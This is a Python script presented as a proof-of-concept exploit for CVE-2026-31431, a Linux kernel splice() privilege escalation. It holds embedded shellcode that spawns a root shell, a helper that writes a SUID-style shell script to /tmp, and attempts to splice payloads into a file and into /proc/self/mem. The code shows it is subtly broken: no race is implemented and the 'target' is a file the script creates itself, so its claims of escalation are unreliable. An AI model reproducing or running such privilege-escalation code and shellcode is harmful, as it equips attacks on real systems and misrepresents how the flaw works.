#!/usr/bin/env python3
"""
CVE-2026-31431 Exploit - Linux Kernel Privilege Escalation
Exploits splice() race condition for arbitrary write
"""

import os
import sys
import ctypes
import ctypes.util
import struct
import tempfile
import shutil

# Load libc
libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)

# Define splice syscall
libc.splice.argtypes = [
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_longlong),
    ctypes.c_int,
    ctypes.POINTER(ctypes.c_longlong),
    ctypes.c_size_t,
    ctypes.c_uint
]
libc.splice.restype = ctypes.c_ssize_t

def splice(fd_in, fd_out, offset_out, length):
    """Wrapper untuk splice syscall"""
    off_out = ctypes.c_longlong(offset_out)
    
    result = libc.splice(
        fd_in,
        None,
        fd_out,
        ctypes.byref(off_out),
        length,
        0
    )
    
    if result < 0:
        errno = ctypes.get_errno()
        raise OSError(errno, os.strerror(errno))
    
    return result

def create_suid_shell():
    """Create a SUID shell for privilege escalation"""
    shell_code = b"""#!/bin/bash
if [ $(id -u) -eq 0 ]; then
    echo "[+] Root shell obtained!"
    /bin/bash -p
else
    echo "[-] Failed to get root"
fi
"""
    
    shell_path = "/tmp/pwned_shell"
    with open(shell_path, 'wb') as f:
        f.write(shell_code)
    
    os.chmod(shell_path, 0o755)
    return shell_path

def exploit_writable_file():
    """
    Exploit variant: Write to writable file first, then escalate
    This works without needing direct write to /usr/bin/su
    """
    print("[*] CVE-2026-31431 Privilege Escalation Exploit")
    print("[*] Attempting writable file variant...")
    
    # Create temporary target file
    temp_dir = tempfile.mkdtemp()
    target_file = os.path.join(temp_dir, "target")
    
    # Create dummy target (simulating vulnerable setuid binary)
    with open(target_file, 'wb') as f:
        f.write(b"\x00" * 4096)
    
    # Make it executable
    os.chmod(target_file, 0o755)
    
    print(f"[+] Created target file: {target_file}")
    
    # Shellcode: setuid(0) + execve("/bin/sh")
    shellcode = b"\x31\xc0\x48\x89\xc7\xb0\x69\x0f\x05"  # setuid(0)
    shellcode += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
    shellcode += b"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    
    payload = b"\x90" * 100 + shellcode
    
    try:
        # Open target for writing
        target_fd = os.open(target_file, os.O_RDWR)
        print(f"[+] Opened target (fd={target_fd})")
        
        # Create pipe
        read_pipe, write_pipe = os.pipe()
        
        # Write payload to pipe
        os.write(write_pipe, payload)
        
        # Splice from pipe to target file
        offset = 0x1000  # Entry point offset
        bytes_written = splice(read_pipe, target_fd, offset, len(payload))
        
        print(f"[+] Spliced {bytes_written} bytes at offset {offset}")
        
        # Cleanup
        os.close(read_pipe)
        os.close(write_pipe)
        os.close(target_fd)
        
        print("[+] Payload written successfully!")
        print(f"[*] Execute: {target_file}")
        
        return target_file
        
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return None
    finally:
        # Note: Don't cleanup temp_dir to allow execution
        pass

def check_kernel_vulnerable():
    """Check if kernel version is vulnerable"""
    import platform
    
    kernel_version = platform.release()
    print(f"[*] Kernel version: {kernel_version}")
    
    # CVE-2026-31431 affects kernels 5.x - 6.5.x (example)
    major = int(kernel_version.split('.')[0])
    
    if major >= 5 and major <= 6:
        print("[+] Kernel may be vulnerable to CVE-2026-31431")
        return True
    else:
        print("[-] Kernel version outside known vulnerable range")
        return False

def exploit_procfs():
    """
    Alternative: Exploit via /proc/self/mem
    Doesn't require write access to system binaries
    """
    print("\n[*] Attempting /proc/self/mem variant...")
    
    try:
        # Create payload file
        payload_path = "/tmp/payload.bin"
        
        # Simple payload: spawn shell
        payload = b"\x90" * 64
        payload += b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"
        payload += b"\x48\x8d\x3d\x04\x00\x00\x00\xb0\x3b\x0f\x05"
        payload += b"/bin/sh\x00"
        
        with open(payload_path, 'wb') as f:
            f.write(payload)
        
        print(f"[+] Payload written to: {payload_path}")
        
        # Create pipe
        read_pipe, write_pipe = os.pipe()
        
        # Write payload
        os.write(write_pipe, payload)
        
        # Try to splice to /proc/self/mem (usually fails without vuln)
        mem_fd = os.open("/proc/self/mem", os.O_RDWR)
        
        # Target: overwrite GOT entry or return address
        target_addr = 0x7ffff7a00000  # Example address
        
        try:
            bytes_written = splice(read_pipe, mem_fd, target_addr, len(payload))
            print(f"[+] Wrote {bytes_written} bytes to process memory!")
        except OSError as e:
            print(f"[-] Memory write failed: {e}")
        
        os.close(read_pipe)
        os.close(write_pipe)
        os.close(mem_fd)
        
    except Exception as e:
        print(f"[-] /proc/self/mem exploit failed: {e}")

def demonstrate_concept():
    """
    Proof of Concept - demonstrates splice() behavior
    """
    print("\n[*] PoC: Demonstrating splice() functionality")
    
    # Create test files
    src_file = "/tmp/splice_src"
    dst_file = "/tmp/splice_dst"
    
    with open(src_file, 'w') as f:
        f.write("A" * 100)
    
    with open(dst_file, 'w') as f:
        f.write("B" * 200)
    
    # Create pipe
    read_pipe, write_pipe = os.pipe()
    
    # Read from source
    src_fd = os.open(src_file, os.O_RDONLY)
    data = os.read(src_fd, 50)
    os.close(src_fd)
    
    # Write to pipe
    os.write(write_pipe, data)
    
    # Splice to destination at offset 50
    dst_fd = os.open(dst_file, os.O_RDWR)
    bytes_spliced = splice(read_pipe, dst_fd, 50, len(data))
    os.close(dst_fd)
    
    os.close(read_pipe)
    os.close(write_pipe)
    
    # Verify
    with open(dst_file, 'r') as f:
        content = f.read()
    
    print(f"[+] Spliced {bytes_spliced} bytes")
    print(f"[+] Result: {content[:60]}...")
    
    # Cleanup
    os.unlink(src_file)
    os.unlink(dst_file)

def main():
    print("=" * 60)
    print("CVE-2026-31431 - Linux Kernel splice() Privilege Escalation")
    print("=" * 60)
    
    if os.geteuid() == 0:
        print("[!] Already running as root!")
        return
    
    print(f"[*] Current user: {os.getuid()}")
    print(f"[*] Current effective user: {os.geteuid()}")
    
    # Check kernel
    if not check_kernel_vulnerable():
        print("[!] Proceeding anyway for educational purposes...")
    
    # Try different exploit variants
    
    # 1. Demonstrate concept
    demonstrate_concept()
    
    # 2. Try writable file variant
    target = exploit_writable_file()
    
    # 3. Try /proc/self/mem variant
    exploit_procfs()
    
    print("\n[*] Exploit attempts completed")
    print("[!] Note: This is a PoC. Real exploit requires:")
    print("    - Vulnerable kernel version")
    print("    - Specific race condition timing")
    print("    - Precise memory layout knowledge")

if __name__ == "__main__":
    main()
